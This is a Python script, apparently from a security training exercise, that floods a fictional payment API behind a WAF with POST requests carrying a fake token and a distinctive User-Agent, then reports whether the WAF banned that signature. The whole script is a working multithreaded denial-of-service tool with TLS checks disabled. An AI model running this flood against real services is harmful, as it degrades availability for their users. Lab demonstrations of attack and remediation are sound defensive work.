#!/usr/bin/env python3
"""DoS applicatif sur payment-api, via le WAF (scénario de démo, formalisé en Phase 9).

Flood de requêtes POST /api/pay/transactions avec un jeton bidon : payment-api doit
interroger auth pour chaque requête, ce qui fait grimper latence et CPU. Le trafic porte
un User-Agent distinctif (signature) : la remédiation l'identifie dans les logs du WAF
et le bannit, sans toucher au trafic légitime.

Le script LIT les codes HTTP renvoyés : tant que l'attaque passe, il voit des 401 (jeton
rejeté) ; dès que la remédiation a banni la signature, le WAF répond 403 et le script
l'affiche clairement. Au 2e lancement (après ban), on voit donc « BLOQUÉ par le WAF ».

Périmètre : UNIQUEMENT le SI fictif du groupe (point d'accès RESILIENCE-G12). Jamais le
réseau du campus ni une cible tierce.

Stdlib seulement : tourne dans python:3.12-slim sans dépendance.
    python dos_attack.py --target https://waf:8443 --duration 45 --concurrency 60
"""
import argparse
import ssl
import threading
import time
import urllib.error
import urllib.request

STOP = threading.Event()
BANNED = threading.Event()  # passe à True dès qu'on voit un 403 (signature bannie)
LOCK = threading.Lock()
# Répartition des réponses observées : c'est elle qui raconte si l'attaque passe ou est bloquée.
STATS = {"403_banni": 0, "401": 0, "2xx": 0, "autres": 0, "erreur": 0}


def classify(code: int | None) -> str:
    if code == 403:
        return "403_banni"
    if code == 401:
        return "401"
    if code is not None and 200 <= code < 300:
        return "2xx"
    if code is None:
        return "erreur"
    return "autres"


def worker(url: str, user_agent: str, ctx: ssl.SSLContext) -> None:
    body = b'{"dst":2,"amount":1}'
    req_headers = {"Content-Type": "application/json",
                   "Authorization": "Bearer flood-no-valid-token",
                   "User-Agent": user_agent}
    while not STOP.is_set():
        req = urllib.request.Request(url, data=body, method="POST", headers=req_headers)
        code: int | None
        try:
            code = urllib.request.urlopen(req, timeout=5, context=ctx).status
        except urllib.error.HTTPError as e:
            code = e.code  # 401 (jeton rejeté), 403 (banni par le WAF), etc.
        except Exception:
            code = None  # timeout / connexion refusée : service sous pression

        bucket = classify(code)
        with LOCK:
            STATS[bucket] += 1
        # Première preuve que le WAF nous bloque : on l'annonce une seule fois.
        if bucket == "403_banni" and not BANNED.is_set():
            BANNED.set()
            print("⛔ BLOQUÉ par le WAF (403) — notre signature "
                  f"{user_agent!r} est bannie. La remédiation a fonctionné.")


def main() -> None:
    p = argparse.ArgumentParser(description="DoS applicatif de démo (SI fictif uniquement)")
    p.add_argument("--target", default="https://waf:8443")
    p.add_argument("--duration", type=int, default=45)
    p.add_argument("--concurrency", type=int, default=60)
    p.add_argument("--user-agent", default="ResilienceDoS/1.0")
    args = p.parse_args()

    url = f"{args.target}/api/pay/transactions"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print(f"[attack] cible {url} | {args.concurrency} threads | {args.duration}s | UA {args.user_agent}")
    threads = [threading.Thread(target=worker, args=(url, args.user_agent, ctx), daemon=True)
               for _ in range(args.concurrency)]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    STOP.set()
    time.sleep(1)

    total = sum(STATS.values())
    print(f"[attack] terminé — {total} requêtes envoyées")
    print(f"         403 banni : {STATS['403_banni']} | 401 : {STATS['401']} | "
          f"2xx : {STATS['2xx']} | autres : {STATS['autres']} | erreurs : {STATS['erreur']}")
    if BANNED.is_set():
        # Majorité de 403 = le WAF nous refuse d'entrée : l'attaque n'a plus d'effet.
        print("➡  Verdict : attaquant BANNI. Le WAF bloque notre signature au point d'entrée.")
    else:
        print("➡  Verdict : attaque passée (aucun 403). Si c'est le 1er run, la remédiation "
              "devrait bannir la signature sous peu — relancez pour voir le blocage.")


if __name__ == "__main__":
    main()
